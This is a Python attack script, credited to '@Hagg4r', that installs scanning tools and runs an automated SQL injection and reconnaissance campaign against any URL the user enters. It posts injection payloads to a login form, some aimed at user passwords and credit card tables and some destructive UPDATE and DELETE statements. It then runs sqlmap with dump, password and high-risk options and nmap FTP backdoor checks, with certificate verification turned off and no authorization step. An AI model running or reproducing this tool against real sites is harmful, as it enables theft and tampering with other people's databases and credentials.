print("by @Hagg4r")                                                                                             

import os
import subprocess
import requests
from requests.exceptions import RequestException, SSLError
from datetime import datetime
import urllib3
import time
import sys

urllib3.disable_warnings()

file_count = 1  # Initialize file_count globally

def run_command(command):
    """Run a command and return its output."""
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def run_sudo_command(command):
    """Run a command with sudo and return its output."""
    result = subprocess.run(['sudo'] + command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.stdout, result.stderr

def save_to_file(filepath, data):
    """Save data to a file."""
    with open(filepath, 'a') as file:
        file.write(data + '\n')

def install_tools():
    """Install necessary tools if not already installed."""
    tools = {
        "uniscan": ["sudo", "apt-get", "install", "-y", "uniscan"],
        "nmap": ["sudo", "apt-get", "install", "-y", "nmap"],
        "sqlmap": ["sudo", "apt-get", "install", "-y", "sqlmap"],
        "whois": ["sudo", "apt-get", "install", "-y", "whois"],
        "subfinder": ["sudo", "apt-get", "install", "-y", "subfinder"],
        "seclists": ["sudo", "apt-get", "install", "-y", "seclists"]
    }
    
    for tool, install_command in tools.items():
        print(f"Checking if {tool} is installed...")
        if not is_tool_installed(tool):
            print(f"{tool} not found. Installing {tool}...")
            stdout, stderr = run_sudo_command(install_command)
            if stdout:
                print(stdout)
            if stderr:
                print(stderr)
        else:
            print(f"{tool} is already installed.")

def is_tool_installed(tool_name):
    """Check if a tool is installed."""
    return subprocess.call(["which", tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def clear_screen():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    """Print the animated header 'hagg4rscan'."""
    colors = ['\033[91m', '\033[93m', '\033[92m', '\033[94m', '\033[95m', '\033[96m']
    header = """
     __  .__   __.   ______  __    __   __          ___   .___________.  ______   .______      
|  | |  \ |  |  /      ||  |  |  | |  |        /   \  |           | /  __  \  |   _  \     
|  | |   \|  | |  ,----'|  |  |  | |  |       /  ^  \ `---|  |----`|  |  |  | |  |_)  |    
|  | |  . `  | |  |     |  |  |  | |  |      /  /_\  \    |  |     |  |  |  | |      /     
|  | |  |\   | |  `----.|  `--'  | |  `----./  _____  \   |  |     |  `--'  | |  |\  \----.
|__| |__| \__|  \______| \______/  |_______/__/     \__\  |__|      \______/  | _| `._____|                                                                               
    """
    for i in range(len(colors)):
        sys.stdout.write("\r" + colors[i] + header)
        sys.stdout.flush()
        time.sleep(0.5)
    print("\033[0m")  # Reset color to default

def check_website_status(url):
    """Check if the website is accessible."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"The website {url} is accessible.")
            return True
        else:
            print(f"The website {url} is not accessible. Status code: {response.status_code}")
            return False
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return False

def perform_sql_injection(target_url, results_dir):
    """Perform SQL Injection using the provided payloads."""
    global file_count  # Declare file_count as global
    payloads = [
        "' OR 1=1 --",
        "' OR '1'='1' --",
        "' OR '1'='1'/*",
        "' OR '1'='1'#",
        "' OR 1=1 UNION SELECT 1,2,3 --",
        "' OR 1=1 UNION SELECT NULL, NULL, NULL --",
        "' OR 1=1 UNION SELECT username, password FROM users --",
        "' OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns --",
        "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
        "' OR 1=1 UNION SELECT email FROM users --",
        "' OR 1=1 UNION SELECT password FROM users --",
        "' OR 1=1 UNION SELECT contact_name, contact_number FROM contacts --",
        "SELECT * FROM users WHERE username='admin';",
        "INSERT INTO users (username, password) VALUES ('newuser', 'newpassword');",
        "UPDATE users SET password='newpassword' WHERE username='admin';",
        "DELETE FROM users WHERE username='olduser';",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' UNION SELECT username, password FROM users;",
        "SELECT * FROM users WHERE username='user_input' AND password='password_input';",
        "SELECT * FROM users WHERE username='admin' AND password=' OR 1=1 -- ';",
        "SELECT * FROM products WHERE name LIKE '%user_input%';",
        "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
    ]
    
    file_count = 1  # Initialize file_count for this function
    
    for payload in payloads:
        data = {
            'username': f'admin{payload}',
            'password': 'password'  # Update with the correct password field if needed
        }

        try:
            response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
            output_file = os.path.join(results_dir, f'sql_injection_{file_count}.txt')
            with open(output_file, 'w') as file:
                file.write(response.text)
            print(f"Saved SQL Injection results to {output_file}")
            file_count += 1
        except Exception as e:
            print(f"An error occurred during SQL Injection attempt: {e}")

def perform_sqlmap_scan(target_url, results_dir):
    """Perform a SQLmap scan on the target URL."""
    global file_count  # Declare file_count as global
    commands = [
        ["sqlmap", "-u", target_url, "--dbs"],
        ["sqlmap", "-u", target_url, "--tables"],
        ["sqlmap", "-u", target_url, "--columns"],
        ["sqlmap", "-u", target_url, "--dump"],
        ["sqlmap", "-u", target_url, "--batch"],
        ["sqlmap", "-u", target_url, "--level=5", "--risk=3"],
        ["sqlmap", "-u", target_url, "--technique=U"],
        ["sqlmap", "-u", target_url, "--technique=T"],
        ["sqlmap", "-u", target_url, "--passwords"],
        ["sqlmap", "-u", target_url, "--users"],
        ["sqlmap", "-u", target_url, "--current-user"],
        ["sqlmap", "-u", target_url, "--current-db"],
        ["sqlmap", "-u", target_url, "--is-dba"],
        ["sqlmap", "-u", target_url, "--roles"],
        ["sqlmap", "-u", target_url, "--privileges"],
        ["sqlmap", "-u", target_url, "--fingerprint"]
    ]
    
    for command in commands:
        try:
            stdout, stderr = run_command(command)
            output_file = os.path.join(results_dir, f'sqlmap_scan_{file_count}.txt')
            with open(output_file, 'w') as file:
                file.write(stdout)
            print(f"Saved SQLmap scan results to {output_file}")
            file_count += 1
        except Exception as e:
            print(f"An error occurred during SQLmap scan: {e}")

def perform_ftp_scan(target_url, results_dir):
    """Perform an FTP scan on the target URL."""
    global file_count  # Declare file_count as global
    command = ["nmap", "-p", "21", "--script", "ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221", target_url]
    try:
        stdout, stderr = run_command(command)
        output_file = os.path.join(results_dir, f'ftp_scan_{file_count}.txt')
        with open(output_file, 'w') as file:
            file.write(stdout)
        print(f"Saved FTP scan results to {output_file}")
        file_count += 1
    except Exception as e:
        print(f"An error occurred during FTP scan: {e}")

def access_seclists():
    """Function to access seclists database (placeholder implementation)."""
    # Implement the actual logic to access seclists as needed
    # This is just a placeholder function
    return "Seclists database accessed successfully."

def main():
    """Main function to orchestrate the security scans."""
    global file_count
    
    target_url = input("Enter the target URL: ")
    results_dir = input("Enter the results directory: ")

    if not os.path.exists(results_dir):
        os.makedirs(results_dir)

    if check_website_status(target_url):
        perform_sql_injection(target_url, results_dir)
        perform_ftp_scan(target_url, results_dir)
        perform_sqlmap_scan(target_url, results_dir)
        seclists_db = access_seclists()
        print(seclists_db)
    else:
        print("The website is not accessible. Exiting...")

if __name__ == "__main__":
    main()
